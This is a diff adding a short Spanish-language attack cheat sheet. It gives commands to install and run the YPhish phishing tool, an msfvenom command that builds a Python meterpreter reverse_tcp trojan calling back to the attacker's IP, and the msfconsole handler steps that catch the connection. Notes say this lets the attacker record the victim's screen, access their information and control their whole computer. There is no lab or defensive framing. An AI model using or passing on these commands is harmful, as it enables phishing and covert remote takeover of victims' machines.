@@ -1,0 +1,43 @@
+Phishing con yPhish
+
+
+git clone https://github.com/thiagous06/YPhish.git
+cd YPhish
+chmod +x install.sh
+./install.sh
+python3 YPhish.py
+
+
+
+
+************** Creando troyanoo **************
+
+msfvenom
+
+msfvenom -p python/meterpreter/reverse_tcp LHOST='ip de nosotros' LPORT=4444 -o troyanoo.py
+
+-python el lenguaje en el cual desarrollaremos el troyano
+-meterpreter nos permite una vez que accedemos a la victima, grabar pantalla 
+de la victima, acceder asu informarcion, en pocas palabras controlar toda su pc
+-reverse_tcp es para que la victima se conecte a nosotros a nuestra ip 
+y a nuestro puerto
+LHOST la ip de nosotros para que la victima se vincule a nuestra maquina
+LPORT nuestro puerto
+-o nuestro output que vendria siendo el troyano que vamos a crear
+sudo ifconfig
+
+************ Obteniedo acceso ************
+
+msfconsole
+
+use  exploit/multi/handler
+
+show options
+
+set LHOST 'ip de tu maquina kali'
+
+set payload python/meterpreter/reverse_tcp
+
+run
+
+help 
